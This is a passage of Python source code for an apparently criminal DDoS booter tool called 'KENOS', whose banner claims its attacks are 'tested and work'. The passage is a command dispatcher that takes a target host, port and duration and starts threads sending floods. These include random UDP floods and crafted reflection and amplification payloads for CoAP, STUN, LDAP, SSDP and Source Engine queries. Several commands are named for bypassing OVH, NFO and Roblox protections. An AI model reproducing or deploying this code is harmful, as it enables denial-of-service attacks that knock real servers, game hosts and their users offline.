					pack = 3072
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					threading.Thread(target=udpsender, args=(host, port, timer, pack)).start()
					threading.Thread(target=killallicmp, args=(host, port, timer, payload)).start()
					threading.Thread(target=killallvse, args=(host, port, timer, payload)).start()
					threading.Thread(target=mixudp, args=(host, port, timer, payload)).start()
					threading.Thread(target=killalludp, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 34000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 45064
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 51282
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "coap":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x40\x01\x01\x01\xbb\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x04\x63\x6f\x72\x65"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "coapv2":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x44\x01\x0f\x3c\xd1\x97\x96\xc1\xc1\x3c\xff\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stun":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = (b"\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stomp":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = (b"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA")
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "rdpudp":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ipsec":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ldap":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xef\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xd1\xff\x01TSource Engine Query\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "onhold":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=onholdsender, args=(host, port, timer, punch)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnull":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxbypass":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xd8\xbb\xc1\x5d\xd8\x6d\x10\x0c\x6b\x3d\x84\xea\x08\x00\x45\x00\x00\x4e\x5f\xfa\x40\x00\x38\x11\x6e\x7c\x80\x74\x31\xfe\xc0\xa8\x01\x0e\xf3\x65\xd6\x03\x00\x3a\x86\xde\x0f\xbd\x2c\x97\x18\xd1\xec\x15\xb7\xdf\xe3\xcd\x0c\x76\xe2\xc3\xa3\x1d\xd4\x31\x68\x20\xb8\x66\x07\xcf\x25\x1b\xe3\x5d\xa4\x2e\xfb\x72\xe9\xfb\x84\x0b\x2e\xc9\x07\x19\x3d\x15\xa2\x35\x00\xfa\xa2\xf7"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 8128
					punch = random._urandom(int(pack))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=tcp, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x05\x14\x06\x01\x03\x64"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "junk":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			print ("\n     \033[97mKENOS ⮞⮞ Stopped running attacks.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stopattacks":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("\n     \033[97mKENOS ⮞⮞ Stopped running attacks.\n")
				udp = False
				while not udp:
					if aid == 0:
						print ("\n     \033[36mKENOS ⮞ No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("\n     \033[36mKENOS ⮞ Stopping All ICMP Attacks.\n")
				icmp = False
				while not icmp:
					print ("\n     \033[36mKENOS ⮞ No ICMP Processes Running.")
					icmp = True
					main()
			if what == "tcp":
				print ("\n     \033[36mKENOS ⮞ Stopping All TCP Attacks.\n")
				tcp = False
				while not tcp:
					print ("\n     \033[36mKENOS ⮞ No TCP Processes Running.")
					tcp = True
					main()
			if what == "ldap":
				print ("\n     \033[36mKENOS ⮞ Stopping All LDAP Attacks.\n")
				ldap = False
				while not ldap:
					print ("\n     \033[36mKENOS ⮞ No LDAP Processes Running.")
					ldap = True
					main()
			if what == "syn":
				print ("\n     \033[36mKENOS ⮞ Stopping All SYN Attacks.\n")
				syn = False
				while not syn:
					print ("\n     \033[36mKENOS ⮞ No SYN Processes Running.")
					syn = True
					main()
			if what == "http":
				print ("\n     \033[36mKENOS ⮞ Stopping All HTTP Attacks.\n")
				http = False
				while not http:
					print ("\n     \033[36mKENOS ⮞ No HTTP Processes Running.")
					http = True
					main()
		else:
			print ("\n     \033[97mKENOS ⮞⮞ {} is not a command.\n".format(sinput))
			main()

# Details
try:
	users = "root"
	clear = "clear"
	os.system ("clear")
	username = getpass.getpass ("\x1b[0;38;2;0;255;255m╔═══════════════════════════════════════════════════════════════════════════════════════════╗\n\x1b[0;38;2;0;247;255m║\x1b[0m                                         Welcome to Kenos                                  \x1b[0;38;2;0;247;255m║\n\x1b[0;38;2;0;239;255m║                                        \x1b[0m[\x1b[0;32m+\x1b[0m] Read This! [\x1b[0;32m+\x1b[0m]                                 \x1b[0;38;2;0;239;255m║\n\x1b[0;38;2;0;231;255m║\x1b[0m[\x1b[0;32m+\x1b[0m]=====================================================================================[\x1b[0;32m+\x1b[0m]\x1b[0;38;2;0;231;255m║\n\x1b[0;38;2;0;223;255m║\x1b[0m     ------------------------------ * Attacks tested and work * ----------------------     \x1b[0;38;2;0;223;255m║\n\x1b[0;38;2;0;215;255m║\x1b[0m     -------------------------------- * Coded by D3fe4ted * --------------------------     \x1b[0;38;2;0;215;255m║\n\x1b[0;38;2;0;207;255m║\x1b[0m            ---------------------- Press ENTER 2x to continue -----------------            \x1b[0;38;2;0;207;255m║\n\x1b[0;38;2;0;199;255m╠════════════════════════════════════════════════════════════════╦══════════════════════════╣\n\x1b[0;38;2;0;191;255m║                           \x1b[0m[\x1b[0;32m+\x1b[0m] Info [\x1b[0;32m+\x1b[0m]                         \x1b[0;38;2;0;191;255m║      \x1b[0m[\x1b[0;32m+\x1b[0m] Stats [\x1b[0;32m+\x1b[0m]       \x1b[0;38;2;0;191;255m║\n\x1b[0;38;2;0;183;255m║                                                                ║                          ║\n\x1b[0;38;2;0;175;255m║\x1b[0m[\x1b[0;32m+\x1b[0m]==========================================================[\x1b[0;32m+\x1b[0m]\x1b[0;38;2;0;175;255m║\x1b[0m[\x1b[0;32m+\x1b[0m]====================[\x1b[0;32m+\x1b[0m]\x1b[0;38;2;0;175;255m║\n\x1b[0;38;2;0;167;255m║\x1b[0m    This project was brought to you by D3fe4ted and the power   \x1b[0;38;2;0;167;255m║\x1b[0m  DSTAT     :  \033[31mDisabled   \x1b[0;38;2;0;167;255m║\n\x1b[0;38;2;0;159;255m║\x1b[0m                       of the internet lol.                     \x1b[0;38;2;0;159;255m║\x1b[0m  HoneyPot  :  \033[32mEnabled    \x1b[0;38;2;0;159;255m║\n\x1b[0;38;2;0;151;255m║                                                                \x1b[0;38;2;0;151;255m║\x1b[0m  Selfrep   :  \033[30mN/A        \x1b[0;38;2;0;151;255m║\n\x1b[0;38;2;0;143;255m╚════════════════════════════════════════════════════════════════╩══════════════════════════╝\n⮞ ")
	if username in users:
		user = username
	else:
		print ("[\033[32m+\033] Invalid Input!\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = [""]
	password = getpass.getpass ("⮞ ")
	if user == "":
		if password == passwords[0]:
			os.system (clear)
			try:
				os.system ("clear")
				rulesAuth()
			except KeyboardInterrupt:
				print ("[\033[32m+\033] Invalid Input!\n")
				rulesAuth()
		else:
			print ("[\033[32m+\033] Invalid Input!\n")
			exit()
except KeyboardInterrupt:
	exit()